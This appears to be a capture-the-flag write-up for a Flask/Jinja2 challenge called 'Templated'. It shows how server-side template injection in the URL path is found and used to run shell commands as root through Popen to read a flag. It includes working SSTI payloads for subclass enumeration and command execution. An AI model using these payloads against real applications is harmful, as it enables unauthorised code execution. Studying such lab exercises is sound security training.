
**Challenge Scenario:**
```txt
Can you exploit this simple mistake?
```

We get an IP address that leads to a webpage which contains almost nothing
![[Pasted image 20260907201200.png]]
- We can see that the website is created using `Flask/Jinja2` so maybe SSTI (Server-Side Template Injection) is possible since also the name of the challenge (`Templated`) may point to that

Running a quick manual search for other pages something struck my eye
- Every time I search for a page that does not exist a page showing Error 404 appears but looking in Burp Suite I discovered that actually the response is `200`
![[Pasted image 20260907201542.png]]
- Also the name of the webpage is printed with a `<str>` tag which is even more suspicious
![[Pasted image 20260907201559.png]]

Based on the current findings I am certain that we are dealing with an SSTI through the webpage in the URL so to test I will pass the `{{7*7}}` input which is standard for SSTI verification in Jinja
![[Pasted image 20260907201857.png]]
- So it is confirmed that we can exploit with the help of SSTI

One of the easiest way for further exploitation is to see if we have access to the `Popen` class to run commands on the target
```python
{%for c in ().__class__.__base__.__subclasses__()%}{%if "Popen" in c.__name__%}{{loop.index0}}-{{c}}{%endif%}{%endfor%}
```
- `().__class__` - access the class tuple
- `__base__` - gives the direct superclass (which is `object`)
- `__subclasses__()` - returns a list of all classes that directly inherit from it

The result comes with the information that `Popen` is available at index `414`
![[Pasted image 20260907202155.png]]

Next we run a simple command like `id` to check if everything works as intended
```python
{{().__class__.__base__.__subclasses__()[414]("id",shell=True,stdout=-1).communicate()}}
```
![[Pasted image 20260907202444.png]]
- The commands are ran by the `root` user which is perfect

Now we only need to find the flag, which with a simple use of `ls` we learn that is located in the current directory
```python
{{().__class__.__base__.__subclasses__()[414]("ls",shell=True,stdout=-1).communicate()}}
```
![[Pasted image 20260907202609.png]]
- Using `cat` we get the flag
```python
{{().__class__.__base__.__subclasses__()[414]("cat flag.txt",shell=True,stdout=-1).communicate()}}
```
![[Pasted image 20260907202731.png]]